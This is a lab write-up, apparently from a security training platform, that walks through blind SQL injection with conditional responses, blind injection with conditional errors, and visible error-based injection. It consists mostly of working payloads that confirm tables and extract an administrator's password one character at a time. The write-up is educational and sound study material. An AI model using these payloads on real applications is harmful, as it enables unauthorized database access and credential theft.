# Labs - Blind SQL injection
- Author: [Mateusz Głuchowski](https://github.com/hue1337)


## Lab: Blind SQL injection with conditional responses

1. **Vulnerable parameter:** `category=`

2. **Application behaviour:**
    - *Welcome back* message.
    - Existing cookie and non-existing cookie in the database shows difference in application behaviour.

3. `True/false` confirmation:
    - *Welcome back* in `html`.  
    ```sql
     and 1=0-- - => False
     and 1=1-- - => True
    ``` 

4. Confirmation for *user* table existance:
    ``` sql
    and (select 'WH' from users limit 1) = 'WH'-- -
    ```

5. Confirmation for *administrator* user existance:
    ```sql
    and (select 'WH' from users where username='administrator') = 'WH'-- -
    ```

6. *Administrator* password enumeration:
    - Lenght of the password:
    ```sql
    and (select 'WH' from users where username='administrator' and length(password) > 1) = 'WH' -- -
    ```

    - Is the first charachter of the password \<char>
    ```sql
    and (select substring(password, 1, 1) from users where username='administrator') = 'a'-- -
    ```

## Lab: Blind SQL injection with conditional errors

1. Prove the parameter is vulnerable:
    ```sql
    ' || (select '' from dual) || '
    ```

2. Confirm that *users* table exists in the database
    ```sql
    ' || (select '' from users where rownum=1) ||' 
    ```

3. Confitm that *administrator* exists:
    ```sql
    ' || (select '' from users where username = 'administrator') || '
    ```

    ```sql
    ' || (select case when (1=0) then to_char(1/0) else '' end from dual) || '
    ```

    ```sql
    ' || (select case when (1=1) then to_char(1/0) else '' end from users where username = 'administrator') || '
    ```

4. Determine the length of the password:
    ```sql
    ' || (select case when (1=1) then to_char(1/0) else '' end from users where username = 'administrator' and length(password)>5) ||'
    ```

5. Determine the first letter:
    ```sql
    ' || (select case when (1=1) then to_char(1/0) else '' end from users where username = 'administrator' and substr(password, 1, 1)='a')||'
    ```

6. Prepare the script:
    

## Lab: Visible error-based SQL injection
-  Analysis:
    ```sql
    SQL SELECT * FROM tracking WHERE id = 'mOe4KUeoO3GZ2mGD''
    ```
    
    ```sql
     and cast((select 1) as int)-- -
     and 1=cast((select 1) as int)-- -
    ```
    
    ```sql
    and 1=CAST((select username from users) as int)-- - We ran out of chars. Remove tracking ID
    ```

    ```sql
    and 1=CAST((select username from users limit 1) as int)-- - We ran out of chars. Remove tracking ID
    ```

    ```sql
    and 1=CAST((select password from users limit 1) as int)-- -
    ```
